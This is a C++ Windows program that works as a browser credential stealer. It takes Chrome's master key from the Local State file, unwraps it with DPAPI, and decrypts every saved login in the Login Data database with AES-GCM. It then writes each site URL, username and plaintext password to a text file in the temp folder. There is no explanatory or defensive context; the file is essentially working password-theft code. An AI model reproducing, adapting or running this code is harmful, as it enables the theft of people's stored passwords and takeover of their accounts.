#include <iostream>
#include <fstream>
#include <string>
#include <limits>
#include <cassert>
#include <windows.h>
#include <openssl\evp.h>
#include <openssl\err.h>
#include "sqlite3\sqlite3.h"

using namespace std;

int gcm_decrypt(unsigned char *ciphertext, int ciphertext_len,
				unsigned char *aad, int aad_len,
				unsigned char *tag,
				unsigned char *key,
				unsigned char *iv, int iv_len,
				unsigned char *plaintext);

int main(void)
{
	string encodedKeyBase64 = "";
	string stringToFind = "{\"encrypted_key\":\"";
	short stringIter = 0;
	string baseFilePath = getenv("LOCALAPPDATA");
	string localStateFilePath = baseFilePath + "\\Google\\Chrome\\User Data\\Local State";
	char localStateFileCharacter;
	bool foundChromeDatabaseDecryptionKey = false;

	ifstream localStateFile(localStateFilePath);
	if (!localStateFile.is_open())
	{
		cerr << "Could not open Google Chrome Local State file on " << localStateFilePath << endl;
		exit(EXIT_FAILURE);
	}

	while (localStateFile >> localStateFileCharacter)
	{
		if (localStateFileCharacter == stringToFind[stringIter])
		{
			stringIter++;
			if (!stringToFind[stringIter])
			{
				foundChromeDatabaseDecryptionKey = true;
				break;
			}
		}

		else
			stringIter = 0;
	}

	if (!foundChromeDatabaseDecryptionKey)
	{
		cerr << "Chrome password database decryption key not found." << endl;
		localStateFile.close();
		exit(EXIT_FAILURE);
	}

	while (localStateFile >> localStateFileCharacter)
	{
		if (localStateFileCharacter == '\"')
			break;

		encodedKeyBase64 += localStateFileCharacter;
	}

	localStateFile.close();

	DATA_BLOB DataIn;

	if (!CryptStringToBinary((LPCSTR)encodedKeyBase64.c_str(), 0, CRYPT_STRING_BASE64, NULL, &DataIn.cbData, NULL, NULL))
	{
		cerr << "CryptStringToBinary failed: " << GetLastError() << endl;
		exit(EXIT_FAILURE);
	}

	BYTE *encodedKeyBase64ByteArray = new BYTE[DataIn.cbData];
	if (encodedKeyBase64ByteArray == nullptr)
	{
		cerr << "BYTE array could not be allocated." << endl;
		exit(EXIT_FAILURE);
	}

	if (!CryptStringToBinary((LPCSTR)encodedKeyBase64.c_str(), 0, CRYPT_STRING_BASE64, encodedKeyBase64ByteArray, &DataIn.cbData, NULL, NULL))
	{
		cerr << "CryptStringToBinary failed: " << GetLastError() << endl;
		delete[] encodedKeyBase64ByteArray;
		exit(EXIT_FAILURE);
	}
	DataIn.pbData = &encodedKeyBase64ByteArray[5];
	DataIn.cbData -= 5;

	DATA_BLOB DataOut;
	DataOut.cbData = 0;
	DataOut.pbData = NULL;

	if (!CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut))
	{
		cerr << "CryptUnprotectData failed: " << GetLastError() << endl;
		delete[] encodedKeyBase64ByteArray;
		LocalFree(DataOut.pbData);
		exit(EXIT_FAILURE);
	}

	delete[] encodedKeyBase64ByteArray;

	sqlite3 *chromePasswordDatabase;

	string chromePasswordDatabasePath = baseFilePath + "\\Google\\Chrome\\User Data\\Default\\Login Data";

	if (sqlite3_open_v2(chromePasswordDatabasePath.c_str(), &chromePasswordDatabase, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK)
	{
		cerr << sqlite3_errmsg(chromePasswordDatabase);
		LocalFree(DataOut.pbData);
		exit(EXIT_FAILURE);
	}

	string chromePasswordDatabaseQuery = "SELECT origin_url, username_value, password_value FROM logins";

	sqlite3_stmt *chromePasswordDatabaseStatement;

	if (sqlite3_prepare_v2(chromePasswordDatabase, chromePasswordDatabaseQuery.c_str(), chromePasswordDatabaseQuery.length() + 1, &chromePasswordDatabaseStatement, NULL) != SQLITE_OK)
	{
		cerr << sqlite3_errmsg(chromePasswordDatabase);
		LocalFree(DataOut.pbData);
		sqlite3_close(chromePasswordDatabase);
		exit(EXIT_FAILURE);
	}

	int sqlite3ResultCode;
	int plaintextLength;
	int encryptedPasswordLength;

	unsigned char *plaintext = new unsigned char[128];

	ofstream outputFile;
	string outputFilePath = getenv("TMP");
	outputFilePath += "\\chromeout.txt";
	outputFile.open(outputFilePath);
	if (!outputFile.is_open())
	{
		cerr << "Could not open output file on " << outputFilePath << endl;
		LocalFree(DataOut.pbData);
		delete[] plaintext;
		sqlite3_finalize(chromePasswordDatabaseStatement);
		sqlite3_close_v2(chromePasswordDatabase);
		exit(EXIT_FAILURE);
	}

	while ((sqlite3ResultCode = sqlite3_step(chromePasswordDatabaseStatement)) == SQLITE_ROW)
	{

		encryptedPasswordLength = sqlite3_column_bytes(chromePasswordDatabaseStatement, 2) - 3;

		const unsigned char *data = sqlite3_column_text(chromePasswordDatabaseStatement, 2);

		unsigned char *encryptedPassword = new unsigned char[encryptedPasswordLength];

		memcpy(encryptedPassword, &data[3], encryptedPasswordLength);

		plaintextLength = gcm_decrypt(&encryptedPassword[12], encryptedPasswordLength - 12 - 16, NULL, 0, &encryptedPassword[encryptedPasswordLength - 16], DataOut.pbData, encryptedPassword, 12, plaintext);

		if (plaintextLength < 0)
		{
			outputFile.close();
			LocalFree(DataOut.pbData);
			delete[] plaintext;
			sqlite3_finalize(chromePasswordDatabaseStatement);
			sqlite3_close_v2(chromePasswordDatabase);
			exit(EXIT_FAILURE);
		}

		plaintext[plaintextLength] = '\0';

		outputFile << sqlite3_column_text(chromePasswordDatabaseStatement, 0) << ", " << sqlite3_column_text(chromePasswordDatabaseStatement, 1) << ", " << plaintext << endl;

		delete[] encryptedPassword;
	}

	if (sqlite3ResultCode == SQLITE_DONE)
	{
		outputFile.close();
		LocalFree(DataOut.pbData);
		delete[] plaintext;
		sqlite3_finalize(chromePasswordDatabaseStatement);
		sqlite3_close_v2(chromePasswordDatabase);
		return 0;
	}

	else
	{
		outputFile.close();
		cerr << sqlite3_errmsg(chromePasswordDatabase);
		LocalFree(DataOut.pbData);
		delete[] plaintext;
		sqlite3_finalize(chromePasswordDatabaseStatement);
		sqlite3_close_v2(chromePasswordDatabase);
		exit(EXIT_FAILURE);
	}
}

void handleErrors(void)
{
	ERR_print_errors_fp(stderr);
	abort();
}

int gcm_decrypt(unsigned char *ciphertext, int ciphertext_len,
				unsigned char *aad, int aad_len,
				unsigned char *tag,
				unsigned char *key,
				unsigned char *iv, int iv_len,
				unsigned char *plaintext)
{
	EVP_CIPHER_CTX *ctx;
	int len;
	int plaintext_len;
	int ret;

	/* Create and initialise the context */
	if (!(ctx = EVP_CIPHER_CTX_new()))
		handleErrors();

	/* Initialise the decryption operation. */
	if (!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
		handleErrors();

	/* Set IV length. Not necessary if this is 12 bytes (96 bits) */
	if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv_len, NULL))
		handleErrors();

	/* Initialise key and IV */
	if (!EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv))
		handleErrors();

	/*
     * Provide any AAD data. This can be called zero or more times as
     * required
     */
	if (!EVP_DecryptUpdate(ctx, NULL, &len, aad, aad_len))
		handleErrors();

	/*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary
     */
	if (!EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
		handleErrors();
	plaintext_len = len;

	/* Set expected tag value. Works in OpenSSL 1.0.1d and later */
	if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag))
		handleErrors();

	/*
     * Finalise the decryption. A positive return value indicates success,
     * anything else is a failure - the plaintext is not trustworthy.
     */
	ret = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);

	/* Clean up */
	EVP_CIPHER_CTX_free(ctx);

	if (ret > 0)
	{
		/* Success */
		plaintext_len += len;
		return plaintext_len;
	}
	else
	{
		/* Verify failed */
		return -1;
	}
}